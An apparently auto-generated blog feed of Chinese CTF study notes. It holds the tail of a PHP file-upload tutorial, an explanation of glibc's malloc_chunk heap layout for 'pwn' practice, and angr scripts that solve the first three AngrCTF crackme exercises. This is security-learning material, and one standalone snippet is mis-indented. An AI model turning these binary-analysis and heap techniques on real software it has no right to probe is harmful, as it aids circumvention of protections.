<span class="string">&#x27;File format error&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>效果（没有加任何CSS代码美化）<br><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210315212041647.png"></li></ul><h2 id="FILES数组"><a href="#FILES数组" class="headerlink" title="$_FILES数组"></a>$_FILES数组</h2><ul><li><code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code> - 上传文件的名称</li><li><code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code> - 上传文件的类型</li><li><code>$_FILES[&quot;file&quot;][&quot;size&quot;]</code> - 上传文件的大小，以字节计</li><li><code>$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]</code> - 存储在服务器的文件的临时副本的名称</li><li><code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code> - 由文件上传导致的错误代码</li></ul><h2 id="index-php文件中用到的函数"><a href="#index-php文件中用到的函数" class="headerlink" title="index.php文件中用到的函数"></a>index.php文件中用到的函数</h2><h3 id="explode"><a href="#explode" class="headerlink" title="explode"></a>explode</h3><ul><li><p>作用: 把字符串打散为数组</p></li><li><p>value_1: 字符串分割标记</p></li><li><p>value_2: 需要分割的字符串</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $str = <span class="string">&quot;Hello world. I love Shanghai!&quot;</span>;</span><br><span class="line">    print_r (explode(<span class="string">&quot; &quot;</span>,$str));</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; Hello [<span class="number">1</span>] =&gt; world. [<span class="number">2</span>] =&gt; I [<span class="number">3</span>] =&gt; love [<span class="number">4</span>] =&gt; Shanghai! )</span><br></pre></td></tr></table></figure><h3 id="current-amp-amp-end"><a href="#current-amp-amp-end" class="headerlink" title="current &amp;&amp; end"></a>current &amp;&amp; end</h3><ul><li><p>作用: 输出数组中的当前元素和最后一个元素的值</p></li><li><p>value: 数组</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $people = <span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>, <span class="string">&quot;Joe&quot;</span>, <span class="string">&quot;Glenn&quot;</span>, <span class="string">&quot;Cleveland&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> current($people) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> end($people);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Peter</span><br><span class="line">Cleveland</span><br></pre></td></tr></table></figure><h3 id="file-exists"><a href="#file-exists" class="headerlink" title="file_exists"></a>file_exists</h3><ul><li><p>作用: 判断上传文件是否已经存在</p></li><li><p>value_1: 文件存储的相对路径(相对路径是相对于你创建的php工程项目)</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_exists(<span class="string">&#x27;../upload/&#x27;</span>.$_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTML页面&quot;&gt;&lt;a href=&quot;#HTML页面&quot; class=&quot;headerlink&quot; title=&quot;HTML页面&quot;&gt;&lt;/a&gt;HTML页面&lt;/h1&gt;&lt;h2 id=&quot;head代码段&quot;&gt;&lt;a href=&quot;#head代码段&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    <category term="php" scheme="http://example.com/categories/web/php/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>pwn heap[malloc_chunk结构体]</title>
    <link href="http://example.com/2021/02/12/CTF/pwn/heap/malloc_chunk%E7%BB%93%E6%9E%84/"/>
    <id>http://example.com/2021/02/12/CTF/pwn/heap/malloc_chunk%E7%BB%93%E6%9E%84/</id>
    <published>2021-02-12T12:23:35.634Z</published>
    <updated>2021-02-12T12:23:02.319Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>文章参考了了网上的一些师傅文章内容，总结了一些自己的理解。</p><h2 id="malloc-chunk结构体成员解析"><a href="#malloc-chunk结构体成员解析" class="headerlink" title="malloc_chunk结构体成员解析"></a>malloc_chunk结构体成员解析</h2><p><code>malloc_chunk</code>结构定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="各个成员的作用"><a href="#各个成员的作用" class="headerlink" title="各个成员的作用"></a>各个成员的作用</h3><ol><li><p><code>prev_size</code></p><ul><li>如果该<code>chunk</code>物理地址相邻的前一<code>chunk</code>(两个指针的差值为前一个chunk大小)是空闲的<code>chunk</code>，这个字段记录的是前一个字符段的大小</li><li>用于储存物理地址相邻的<code>chunk</code>(低地址chunk)的信息</li><li>被共享，如果当前<code>chunk</code>大不够用，可以占用下一个<code>chunk</code>的<code>prev_size</code>字段</li></ul></li><li><p><code>size</code></p><ul><li><p>存储当前<code>chunk</code>的大小，chunk的大小内存申请，与<code>SIZE_SZ</code>有关，如果不是<code>2*SIZE_SZ</code>的整数倍，会自动向上取整到<code>2*SIZE_SZ</code>的整数倍，32位操作系统中<code>SIZE_SZ</code>是32位4个字节，64位操作系统中<code>SIZE_SZ</code>是64位8个字节。32位必须8字节对齐，64位必须16字节对齐，无论32位还是64位，<code>size</code>最后三位都没有用，所用可以用来存储其他信息</p><ul><li><p><strong>NON_MAIN_ARENA</strong></p></li><li><p><strong>IS_MAPPED</strong></p><p>记录当前chunk是否是由<code>mmap</code>申请</p></li><li><p><strong>PREV_INUSE</strong></p><p>记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p></li></ul></li></ul></li><li><p><code>fd</code>和<code>bk</code></p><ul><li>chunk处于分配状态时，fd地址段存放的是用户数据。chunk在空闲的时候通过链表管理</li><li><code>fd</code>指向上一个空闲（非物理空闲）的chunk</li><li><code>bk</code>指向下一个空闲（非物理空闲）的chunk</li></ul></li><li><p><code>fd_nextsize</code>和<code>bk_nextsize</code></p><ul><li></li></ul></li></ol><ul><li><p>chunk被使用时内存结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, <span class="keyword">in</span> bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, <span class="keyword">in</span> bytes                |A|<span class="number">0</span>|<span class="number">1</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></li><li><p>chunk被释放时内存结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:<span class="string">&#x27; |             Size of chunk, in bytes                     |A|0|P|</span></span><br><span class="line"><span class="string">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="string">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="string">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="string">        .                                                               .</span></span><br><span class="line"><span class="string"> next   .                                                               |</span></span><br><span class="line"><span class="string">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">`foot:&#x27;</span> |             Size of chunk, <span class="keyword">in</span> bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, <span class="keyword">in</span> bytes                |A|<span class="number">0</span>|<span class="number">0</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></li></ul><h3 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h3><p>malloc函数申请的chunk地址都是8字节或者16字节对齐（32位8字节，64位16字节），所谓字节对齐，就是所有的地址最后8位或16位都是一样的（大多数时候为8的整数倍），常见的内存对齐有8字节对齐和16字节对齐</p><ul><li><p>8字节对齐</p><p>地址的最后8位（2进制位）10进制表示为8</p></li><li><p>16字节对齐</p><p>地址的最后8位（2进制位）10进制表示为0</p></li></ul><p>下面用pwndbg展示32位下chunk内存结构</p><h3 id="pwndbg分析chunk在内存中的结构"><a href="#pwndbg分析chunk在内存中的结构" class="headerlink" title="pwndbg分析chunk在内存中的结构"></a>pwndbg分析chunk在内存中的结构</h3><p>测试源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ptr1 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr2 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr3 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr4 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr5 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr6 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr1-&gt;%p\n&quot;</span>, ptr1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr2-&gt;%p\n&quot;</span>, ptr2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr3-&gt;%p\n&quot;</span>, ptr3);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr4-&gt;%p\n&quot;</span>, ptr4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr5-&gt;%p\n&quot;</span>, ptr5);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr6-&gt;%p\n&quot;</span>, ptr6);</span><br><span class="line">        <span class="built_in">free</span>(ptr1);</span><br><span class="line">        <span class="built_in">free</span>(ptr2);</span><br><span class="line">        <span class="built_in">free</span>(ptr3);</span><br><span class="line">        <span class="built_in">free</span>(ptr4);</span><br><span class="line">        <span class="built_in">free</span>(ptr5);</span><br><span class="line">        <span class="built_in">free</span>(ptr6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>32位程序</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212183615924.png" alt="32位程序malloc申请地址"></p></li><li><p>64位程序</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212183727096.png" alt="64位程序malloc申请地址"></p></li><li><p>heap命令查看所有堆信息</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212184244904.png"></p></li><li><p>分析二进制数据</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212195957160.png"></p><p>64位程序chunk结构与之类似</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;文章参考了了网上的一些师傅文章内容，总结了一些自己的理解。&lt;/p&gt;
&lt;h2 id=&quot;malloc-chunk结构体成员解析&quot;&gt;&lt;a href=&quot;#malloc-chunk结构体成员解析&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>ctf_angr🦄[angr_0]</title>
    <link href="http://example.com/2021/02/11/CTF/angr/ctf_angr_0/"/>
    <id>http://example.com/2021/02/11/CTF/angr/ctf_angr_0/</id>
    <published>2021-02-11T14:41:47.559Z</published>
    <updated>2021-02-11T14:51:50.433Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="ctf-angr"><a href="#ctf-angr" class="headerlink" title="ctf_angr"></a>ctf_angr</h2><p>一个用于练习angr的ctf题库，从入门到进阶，同时配套全英文ppt，从符号执行到angr详细使用方式，一站式入门👍</p><p>GitHub下载地址[<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM">链接</a>]</p><h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>伪代码非常简单,执行流程为：输入-&gt;加密-&gt;比较-&gt;输出，分支少，所以遍历起来速度很快</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211150156381.png"></p><p>伪代码易读，数据的字符串经过complex_function函数加密过后比较。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211150039313.png" alt="main_function"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211150407696.png" alt="complex_function"></p><p>如果按照传统的方法，需要逆加密算法然后写出解密算法，但是angr不需要这些繁琐的操作，只需要告诉其实地址和目标地址，angr就会进行所有遍历，对符号进行约束，从而得出结果。</p><h3 id="angr遍历求解"><a href="#angr遍历求解" class="headerlink" title="angr遍历求解"></a>angr遍历求解</h3><p>首先贴出全代码以及运行结果，最后打印的值就是对符号不断约束求解得到的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">filepath = <span class="string">&#x27;/home/fish/桌面/00_angr_find&#x27;</span></span><br><span class="line"></span><br><span class="line">project = angr.Project(filepath)</span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line">print_good_addr = <span class="number">0x0804867D</span></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line">simulation.explore(find = print_good_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211150835527.png"></p><p>使用angr过程</p><ol><li><p>创建项目</p><p>首先用Project函数创建一个项目，Project参数为需要求解的二进制文件路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">project = angr.Project(filepath)</span><br></pre></td></tr></table></figure></li><li><p>告诉angr从哪儿开始执行</p><p>entry_state()表明从main函数开始执行（从头开始执行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initial_state = project.factory.entry_state()</span><br></pre></td></tr></table></figure></li><li><p>创建模拟管理器</p><p>simgr是创建函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simulation = project.factory.simgr(initial_state)</span><br></pre></td></tr></table></figure></li><li><p>开始探索二进制文件</p><p>explore函数需要遍历的结束地址，也就是这个二进制程序中打印字符串**Good Job.**的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_good_address = <span class="number">0x0804867D</span></span><br><span class="line">simulation.explore(find=print_good_address)</span><br></pre></td></tr></table></figure></li><li><p>检查是否找到了解决方案</p><p>如果找到解决方案，found不为空（在pyhon中空代表false，不为空代表true）,将解决方案打印到屏幕输出端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">   solution_state = simulation.found[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></li></ol><h3 id="总结主要过程"><a href="#总结主要过程" class="headerlink" title="总结主要过程"></a>总结主要过程</h3><p>创建工程 –&gt; 指定执行入口 –&gt; 创建二进制文件执行模拟器 –&gt; 探索各个分支 –&gt; 解出解决方案 –&gt; 打印结果</p><h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><p>​        这一次的文件较大，main函数在ida中不能F5，即便F5过后也可能因为伪代码较复杂无法阅读，所以在简单观察过后可以直接用angr看是否有解，但是作者这次在程序中加了一点料，方便我们学习avoid参数</p><p>should_succeed这个变量初始值为1本身并没有问题但是avoid_me函数会将should_succeed赋值为0。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211161539597.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211161257626.png"></p><p>​        所以这个如果要打印出**Good Job.**需要两个条件同时满足（should_succeed值为1，且输入的字符串加密过后满足条件），如果在遍历时不添加avoid条件会花费大量的时间（虽然结果一样），为了尽可能的节约时间，需要在遍历时避免avoid_me函数，所以在上一个的条件下，需要在添加其他条件，这里需要添加avoid</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">avoid_addr = <span class="number">0x080485A8</span> <span class="comment"># avoid_me函数地址</span></span><br><span class="line">simgr.explore(find = good_addr, avoid = avoid_addr) <span class="comment"># 添加avoid条件</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211162409904.png"></p><h2 id="02-angr-condtion"><a href="#02-angr-condtion" class="headerlink" title="02_angr_condtion"></a>02_angr_condtion</h2><p>出了在ida中直接寻找字符串地址，还可以自定义函数遍历所有字符串，寻找需要的字符串地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自定义函数寻找字符串</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment">#print(state)</span></span><br><span class="line">    stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    print(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_fail</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment">#print(state)</span></span><br><span class="line">    stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    print(stdout_stdout)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br></pre></td></tr></table></figure><p>完整脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    filepath = <span class="string">&#x27;./02_angr_find_condition&#x27;</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init = project.factory.entry_state()</span><br><span class="line">    simgr = project.factory.simgr(init)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_success</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="comment">#print(state)</span></span><br><span class="line">        stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        print(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_fail</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="comment">#print(state)</span></span><br><span class="line">        stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        print(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line">    print(is_success)</span><br><span class="line">    print(is_fail)</span><br><span class="line">    simgr.explore(find=is_success, avoid=is_fail)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution = simgr.found[<span class="number">0</span>]</span><br><span class="line">        flag = solution.posix.dumps(<span class="number">0</span>)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;not find&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()                              </span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211223412140.png" alt="输出结果"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

